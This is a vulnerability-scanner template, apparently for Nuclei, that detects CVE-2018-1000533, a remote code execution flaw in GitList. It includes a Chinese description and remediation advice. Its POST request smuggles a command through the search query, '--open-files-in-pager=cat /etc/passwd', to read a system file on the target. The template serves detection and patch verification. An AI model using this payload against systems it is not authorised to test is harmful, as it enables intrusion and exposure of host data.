id: CVE-2018-1000533
info:
  name: GitList < 0.6.0 Remote Code Execution
  author:
  - pikpikcu
  tags:
  - rce
  - git
  - cve
  - cve2018
  - gitlist
  description: |-
    GitList远程代码执行漏洞
    klaussilveira GitList 是一个使用 PHP 语言编写的具有图形化界面的Git存储库查看器，它支持与多个Git存储库进行交互、支持使用浏览器查看存储库。
    klaussilveira GitList 0.6 及之前版本中的‘searchTree’函数存在安全漏洞，该漏洞源于程序将未正确的过滤的输入传入到‘system’函数。攻击者可利用该漏洞以PHP用户身份执行任意代码。
  reference:
  - https://github.com/vulhub/vulhub/tree/master/gitlist/cve-2018-1000533
  - https://nvd.nist.gov/vuln/detail/cve-2018-1000533
  - https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html
  - https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322
  severity: critical
  classification:
    cve-id:
    - cve-2018-1000533
    cwe-id:
    - cwe-20
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322

    临时修复方案：
    1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。
    2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
requests:
- matchers:
  - type: word
    part: body
    words:
    - root:/root:/bin/bash
  extractors:
  - name: path
    type: regex
    regex:
    - <span class="name">(.*?)</span>
    group: 1
    part: body
    internal: true
  raw:
  - |
    GET / HTTP/1.1
    Host: {{Hostname}}
  - |
    POST /{{path}}/tree/a/search HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    query=--open-files-in-pager=cat%20/etc/passwd
